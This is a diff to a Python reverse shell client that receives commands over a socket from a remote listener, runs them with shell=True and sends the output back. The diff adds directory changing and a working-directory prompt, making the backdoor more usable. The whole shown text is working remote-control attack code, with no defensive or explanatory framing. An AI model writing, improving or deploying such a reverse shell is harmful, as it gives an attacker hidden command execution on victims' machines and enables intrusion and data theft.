@@ -1,5 +1,6 @@
 #!/usr/bin/python
 
+import os
 import socket
 import subprocess
 
@@ -13,12 +14,18 @@ s.send(bytes("[*] Connection Established!", "UTF-8")) # Send connection confirma
 while 1: # Start loop.
     data = s.recv(1024).decode("UTF-8") # Recieve shell command.
     if data == "quit": 
-        break # If its quit, then break out and close socket.
+        break # If it's quit, then break out and close socket.
+    if data[:2] == "cd":
+        os.chdir(data[3:]) # If it's cd, change directory.
     # Run shell command.
-    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
-    stdout_value = proc.stdout.read() + proc.stderr.read() # Read output.
-    s.send(bytes(stdout_value)) # Send output to listener.
-
+    if len(data) > 0:
+        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
+        stdout_value = proc.stdout.read() + proc.stderr.read() # Read output.
+        #s.send(bytes(stdout_value)) # Send output to listener.
+        output_str = str(stdout_value,"UTF-8")
+        currentWD = os.getcwd() + "> "
+        s.send(str.encode(output_str + currentWD))
+    
 s.close() # Close socket.
 
 
